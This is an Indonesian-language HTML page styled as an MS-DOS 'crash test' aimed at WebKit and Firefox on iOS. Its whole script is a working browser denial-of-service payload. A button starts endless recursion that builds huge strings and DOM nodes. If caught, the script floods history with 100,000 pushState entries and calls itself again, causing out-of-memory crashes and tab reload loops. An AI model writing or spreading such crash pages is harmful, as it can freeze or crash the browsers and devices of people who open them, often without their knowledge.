<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS-DOS INTERNAL CRASH TEST v3.2</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');

        body {
            background-color: #000000;
            color: #ff3333; /* Warna merah peringatan */
            font-family: 'Courier Prime', monospace;
            padding: 20px;
        }

        .dos-container {
            border: 2px solid #ff3333;
            padding: 20px;
            max-width: 700px;
            margin: 0 auto;
            box-shadow: 0 0 15px rgba(255, 51, 51, 0.4);
        }

        .header {
            border-bottom: 2px double #ff3333;
            padding-bottom: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }

        .dos-btn {
            background-color: #ff3333;
            color: #000000;
            border: none;
            padding: 10px 20px;
            font-family: monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 4px 4px 0px #550000;
        }

        .dos-btn:active {
            transform: translate(2px, 2px);
            box-shadow: 2px 2px 0px #000;
        }

        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="dos-container">
    <div class="header">
        WARNING: HARDWARE & BROWSER STRESS TEST<br>
        TARGET: WEBKIT / FIREFOX FOR IOS
    </div>

    <p>C:\CRASH> PERINGATAN! Menekan tombol di bawah ini akan memaksa browser mengalokasikan memori ekstrem secara instan.</p>
    <p>Ini akan memicu mekanisme kegagalan WebKit (OOM Crash / Tab Reload Loop).</p>
    <br>
    
    <button class="dos-btn" onclick="executeRealCrash()">[ FORCE CRASH NOW ]</button>

    <p style="margin-top: 30px;">C:\CRASH> <span class="blink">_</span></p>
</div>

<script>
    function executeRealCrash() {
        console.log("Memicu kegagalan sistem...");
        
        // Elemen kontainer tersembunyi untuk menampung sampah memori DOM
        const dump = document.createElement('div');
        document.body.appendChild(dump);

        // 1. Rekursi Tumpukan Maksimal (Stack Overflow) kombinasi Alokasi Objek Besar
        function pembekuMemori() {
            // Membuat string sampah berukuran besar berulang kali di dalam memori
            let leak = new Array(5000000).join("CRASH_TEST_WEBKIT_MEM_FATAL_ERROR_");
            
            // Menyisipkan elemen HTML dalam jumlah jutaan secara paksa untuk melumpuhkan rendering engine
            let p = document.createElement('p');
            p.innerText = leak;
            dump.appendChild(p);
            
            // Rekursi tanpa henti
            pembekuMemori();
        }

        // 2. Loop tambahan eksternal untuk memastikan tidak ada celah bagi browser untuk pulih (Recover)
        try {
            pembekuMemori();
        } catch(e) {
            // Jika tertangkap oleh pelindung browser, hantam lagi dengan duplikasi baris riwayat browser
            for (let i = 0; i < 100000; i++) {
                window.history.pushState({}, '', i);
            }
            // Pemicu terakhir jika masih bertahan: Panggil ulang fungsi utama secara rekursif
            executeRealCrash();
        }
    }
</script>

</body>
</html>
